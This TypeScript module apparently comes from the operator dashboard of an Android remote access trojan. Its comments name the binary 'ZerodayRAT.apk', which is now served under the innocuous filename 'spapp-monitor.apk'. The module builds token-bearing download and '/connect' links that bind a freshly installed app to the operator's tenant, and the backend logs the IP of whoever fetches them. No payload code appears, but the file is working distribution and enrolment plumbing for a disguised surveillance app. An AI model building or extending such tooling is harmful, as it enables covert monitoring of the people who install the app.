import { API_BASE_URL } from "./client";

/**
 * The distributable APK is streamed by the backend, not committed to git.
 *
 * It used to live at dashboard/public/download/ZerodayRAT.apk and was served
 * statically by Vercel, which meant every build added an ~8 MB binary to the
 * repository history forever. The backend now serves the file from disk at
 * GET /api/download/apk (see backend/src/routes/download.routes.js), so this
 * URL is stable across builds and version-independent.
 *
 * The absolute backend origin is used on purpose: Vercel's /api rewrite points
 * at the API host, but a rewrite is not meant for multi-megabyte file streams.
 */
const API_ROOT = API_BASE_URL.replace(/\/+$/, "");

export const APK_DOWNLOAD_URL = `${API_ROOT}/api/download/apk`;
export const APK_INFO_URL = `${API_ROOT}/api/download/apk/info`;

/**
 * Download URL that carries the device token.
 *
 * The backend records (token, client IP, time) when this URL is fetched, and
 * the freshly installed app collects it through POST /api/devices/claim. That
 * replaces the clipboard hand-off, which needed a browser clipboard-write
 * permission prompt and silently lost the token when the write raced the
 * navigation.
 */
export function buildApkDownloadUrl(deviceToken?: string | null): string {
  if (!deviceToken) return APK_DOWNLOAD_URL;
  const q = new URLSearchParams({ token: deviceToken });
  return `${APK_DOWNLOAD_URL}?${q.toString()}`;
}

/** Filename the browser saves the download as (also sent via Content-Disposition). */
export const APK_FILENAME = "spapp-monitor.apk";

/**
 * Public landing page that a shareable device link points at. The device token
 * travels in the query string so the freshly installed app can bind itself to
 * the tenant that created it.
 */
export function buildConnectLink(
  origin: string,
  device?: { device_token?: string | null; device_label?: string | null }
): string {
  const base = `${origin.replace(/\/+$/, "")}/connect`;
  if (!device?.device_token) return base;
  const params = new URLSearchParams({ token: device.device_token });
  if (device.device_label) params.set("name", device.device_label);
  return `${base}?${params.toString()}`;
}
